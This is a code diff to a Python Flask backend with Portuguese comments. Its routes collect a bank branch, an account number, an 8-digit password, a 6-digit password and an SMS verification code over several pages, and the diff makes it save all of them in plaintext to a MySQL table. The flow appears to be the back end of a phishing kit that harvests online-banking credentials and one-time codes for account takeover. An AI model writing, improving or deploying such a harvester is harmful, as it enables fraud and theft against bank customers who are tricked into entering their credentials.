@@ -1,9 +1,9 @@
 from flask import Flask, render_template, request, jsonify
-from bd import conectar  # ⬅️ Importa seu arquivo de conexão
+from bd import conectar
 
 app = Flask(__name__)
 
-# Variável temporária para guardar os dados entre as páginas
+# Guarda temporário no backend
 dados_temp = {}
 
 
@@ -13,7 +13,7 @@ def home():
     return render_template('initial.html')
 
 
-# Recebe dados da primeira página
+# Recebe agência, conta e senha 8 dígitos (somente guarda no backend)
 @app.route('/dadosPageOne', methods=['POST'])
 def receber_dados():
     dados = request.get_json()
@@ -23,27 +23,27 @@ def receber_dados():
 
     agency = dados.get('agency')
     account = dados.get('account')
-    password = dados.get('password')
+    password8 = dados.get('password')
+
+    if not agency or not account or not password8:
+        return jsonify({'status': 'erro', 'mensagem': 'Dados incompletos'}), 400
 
     dados_temp['agency'] = agency
     dados_temp['account'] = account
-    dados_temp['password8'] = password  # senha de 8 dígitos
+    dados_temp['password8'] = password8
 
-    print('✅ Dados recebidos na primeira página:')
-    print('Agência:', agency)
-    print('Conta:', account)
-    print('Senha:', password)
+    print('✅ Dados iniciais armazenados no backend')
 
-    return jsonify({'status': 'sucesso', 'mensagem': 'Dados recebidos com sucesso'})
+    return jsonify({'status': 'sucesso', 'mensagem': 'Dados armazenados no backend'})
 
 
-# Página de senha 6 dígitos
+# Página senha 6 dígitos
 @app.route('/password', methods=['GET'])
 def password_page():
     return render_template('password.html')
 
 
-# Recebe senha 6 dígitos
+# Recebe senha 6 dígitos e faz o INSERT no banco com sms_code NULL
 @app.route('/password', methods=['POST'])
 def recebe_senha():
     dados = request.get_json()
@@ -58,9 +58,39 @@ def recebe_senha():
 
     dados_temp['password6'] = password6
 
-    print('🔑 Senha de 6 dígitos recebida:', password6)
+    conexao = conectar()
+    if conexao:
+        try:
+            cursor = conexao.cursor()
 
-    return jsonify({'status': 'sucesso', 'mensagem': 'Senha de 6 dígitos recebida com sucesso'})
+            inserir = """
+                INSERT INTO digital (agencia, conta, senha_8_digitos, senha_6_digitos, sms_code)
+                VALUES (%s, %s, %s, %s, NULL)
+            """
+
+            valores = (
+                int(dados_temp.get('agency').replace('-', '')),
+                str(dados_temp.get('account')),
+                int(dados_temp.get('password8')),
+                int(password6)
+            )
+
+            cursor.execute(inserir, valores)
+            conexao.commit()
+
+            print('💾 Dados inseridos no banco com sms_code NULL')
+
+            return jsonify({'status': 'sucesso', 'mensagem': 'Dados inseridos com sucesso'})
+
+        except Exception as e:
+            print(f'❌ Erro ao inserir no banco: {e}')
+            return jsonify({'status': 'erro', 'mensagem': 'Erro ao inserir no banco'}), 500
+        finally:
+            cursor.close()
+            conexao.close()
+
+    else:
+        return jsonify({'status': 'erro', 'mensagem': 'Erro na conexão com o banco'}), 500
 
 
 # Página SMS
@@ -69,7 +99,7 @@ def sms_page():
     return render_template('sms.html')
 
 
-# 🔥 Recebe o código SMS e salva tudo no banco
+# Recebe o código SMS e faz o UPDATE
 @app.route('/verificaCodigo', methods=['POST'])
 def verifica_codigo():
     dados = request.get_json()
@@ -84,49 +114,39 @@ def verifica_codigo():
 
     dados_temp['sms_code'] = sms_code
 
-    # 🗄️ Inserir no banco
     conexao = conectar()
-
     if conexao:
         try:
             cursor = conexao.cursor()
 
-            inserir = """
-                INSERT INTO digital (agencia, conta, senha_8_digitos, senha_6_digitos, sms_code)
-                VALUES (%s, %s, %s, %s, %s)
-                ON DUPLICATE KEY UPDATE 
-                    conta=VALUES(conta),
-                    senha_8_digitos=VALUES(senha_8_digitos),
-                    senha_6_digitos=VALUES(senha_6_digitos),
-                    sms_code=VALUES(sms_code);
+            update = """
+                UPDATE digital
+                SET sms_code = %s
+                WHERE agencia = %s AND conta = %s
             """
 
             valores = (
+                str(sms_code),
                 int(dados_temp.get('agency').replace('-', '')),
-                str(dados_temp.get('account')),
-                int(dados_temp.get('password8')),
-                int(dados_temp.get('password6')),
-                str(dados_temp.get('sms_code'))
+                str(dados_temp.get('account'))
             )
 
-
-            cursor.execute(inserir, valores)
+            cursor.execute(update, valores)
             conexao.commit()
 
-            print('💾 Dados inseridos no banco com sucesso.')
+            print('🔐 SMS atualizado com sucesso no banco')
 
-            return jsonify({'status': 'sucesso', 'mensagem': 'Código SMS recebido e dados salvos com sucesso.'})
+            return jsonify({'status': 'sucesso', 'mensagem': 'Código SMS atualizado com sucesso'})
 
         except Exception as e:
-            print(f'❌ Erro ao inserir no banco: {e}')
-            return jsonify({'status': 'erro', 'mensagem': 'Erro ao salvar no banco.'}), 500
-
+            print(f'❌ Erro ao atualizar SMS: {e}')
+            return jsonify({'status': 'erro', 'mensagem': 'Erro ao atualizar o SMS no banco'}), 500
         finally:
             cursor.close()
             conexao.close()
 
     else:
-        return jsonify({'status': 'erro', 'mensagem': 'Erro na conexão com o banco.'}), 500
+        return jsonify({'status': 'erro', 'mensagem': 'Erro na conexão com o banco'}), 500
 
 
 if __name__ == '__main__':
